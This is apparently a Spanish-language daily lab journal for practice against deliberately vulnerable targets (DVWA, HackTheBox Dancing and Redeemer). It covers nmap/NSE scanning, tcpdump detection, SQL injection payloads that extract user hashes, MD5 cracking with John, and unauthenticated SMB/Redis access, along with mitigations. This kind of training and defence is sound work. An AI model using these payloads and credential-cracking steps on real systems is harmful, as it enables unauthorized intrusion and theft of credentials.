# Día 3 — Port Scanning Avanzado (UDP & NSE Scripts)

**MITRE ATT&CK:** T1046 — Network Service Discovery  
**Táctica:** Discovery (TA0007)

## Red Team

### Comandos ejecutados
| Comando | Output |
|---|---|
| `sudo nmap -sU --top-ports 100 <target>` | 60 cerrados, 40 open\|filtered — ningún UDP confirmado abierto |
| `sudo nmap -sS -sU --top-ports 20 <target>` | TCP: 22, 80, 8080 abiertos — UDP: todos cerrados |
| `nmap -sV --script banner <target>` | SSH banner + OWASP Juice Shop identificado en puerto 3000 |
| `nmap --script http-title -p 80,8080,3000 <target>` | Puerto 80: Apache default — 8080: DVWA v1.10 |
| `nmap --script ssh-hostkey -p 22 <target>` | Sin respuesta — OpenSSH 10.0 restrictivo |
| `sudo nmap --script vuln -p 80,8080 <target>` | Cookie sin httponly + directory listing en /config/, /docs/, /external/ |

### Hallazgos
- DVWA v1.10 identificado públicamente — versión exacta expuesta
- Cookie `PHPSESSID` sin flag `httponly` — vulnerable a robo via XSS
- Directory listing activo en `/config/` — posible exposición de credenciales MySQL
- `allow_url_include=on` en php.ini — Remote File Inclusion habilitado
- Apache default page en puerto 80 — servidor mal configurado

### UDP vs TCP
- UDP scan genera estado `open|filtered` — no puede distinguir entre abierto y filtrado
- NSE scripts envían payloads específicos por protocolo — DNS queries, SNMP requests, NTP, TFTP
- `--min-rate 5000` redujo tiempo de scan de 35 minutos a 76 segundos

## Blue Team

### Detección
| Comando | Qué detectó |
|---|---|
| `sudo tcpdump -i enp0s3 -n src host <attacker> and not port 22 -w dia03_capture.pcap` | UDP payloads específicos por protocolo |
| `sudo tcpdump -r dia03_capture.pcap -n` | DHCP, DNS, SNMP, NTP, TFTP, NetBIOS en ~1 segundo |

### Evidencia
- Nmap envió payloads reales — SNMP GetRequest, DNS version.bind, NTP queries
- Todo el scan UDP completado en ~1 segundo — patrón de automatización claro
- Un IDS con firmas de NSE detectaría esto instantáneamente

## Purple Team Analysis

**Effectiveness Score: 60/100**

| Red Team | Blue Team |
|---|---|
| NSE vuln encontró cookie sin httponly y directory listing | tcpdump capturó payloads UDP específicos |
| Banner grabbing reveló versiones exactas | Patrón de múltiples protocolos en 1 segundo visible |
| http-title reveló DVWA v1.10 | Sin alerta automática |

### Security Gaps
- Sin IDS — NSE scan no genera alertas automáticas
- Cookie sin httponly — robo de sesión via XSS posible
- Directory listing activo en /config/
- Apache default page expuesta en puerto 80

### Lección
NSE scripts van más allá del port scanning — simulan comportamiento real de protocolos. La diferencia entre un scan básico y NSE es la diferencia entre llamar a una puerta y intentar abrir la cerradura.

## DVWA — SQL Injection (Low)

### Comandos de explotación
| Input | Output |
|---|---|
| `1'` | Error SQL — MariaDB 10.1.26 expuesta |
| `1' OR '1'='1` | 5 usuarios extraídos — bypass de lógica |
| `1' ORDER BY 3--` | Error — tabla tiene 2 columnas |
| `1' UNION SELECT null, version()#` | MariaDB 10.1.26 confirmada |
| `1' UNION SELECT user, password FROM users#` | 5 hashes MD5 extraídos |
| `john --format=raw-md5 hash.txt` | `password` crackeado en <1 segundo |

### Hallazgos
- MariaDB 10.1.26 identificada via error message
- 5 usuarios y contraseñas extraídos — `admin/password`, `smithy/password`
- MD5 sin salt — crackeado en menos de 1 segundo con John the Ripper
- `--` no funciona como comentario en MariaDB — usar `#`

### Mitigación
- Prepared statements — nunca concatenar input en queries SQL
- Ocultar errores SQL — mensajes genéricos al usuario
- Reemplazar MD5 por bcrypt con salt

## Wazuh
- `sfc /scannow` ejecutado — sistema íntegro, sin archivos corruptos
- **Mitigación aplicada:** AutoAdminLogon deshabilitado — `AutoAdminLogon: 0`
- CIS Benchmark score <30% — pendiente corrección progresiva

## HTB — Dancing (SMB) + Redeemer (Redis)

### Dancing
- Puerto 445 SMB abierto — Windows identificado (TTL=127)
- Share `WorkShares` accesible sin credenciales
- `flag.txt` en carpeta `James.P` — flag obtenida

### Redeemer
- Puerto 6379 Redis abierto — descubierto con `--min-rate 5000 -p-`
- Sin autenticación — `redis-cli -h <target>` → acceso directo
- `keys *` → flag visible — `get flag` → flag obtenida
